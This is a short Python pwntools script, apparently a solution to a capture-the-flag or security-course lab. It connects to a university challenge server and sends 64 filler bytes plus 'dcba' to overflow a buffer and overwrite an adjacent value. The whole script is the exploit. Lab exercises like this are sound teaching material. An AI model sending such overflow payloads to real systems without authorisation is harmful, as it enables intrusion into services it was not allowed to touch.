from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25152

s =  remote(SERVER, PORT, timeout=9999)

print(s.recvline())
s.sendline(b"a"*64 + b"dcba")
print(s.recvall())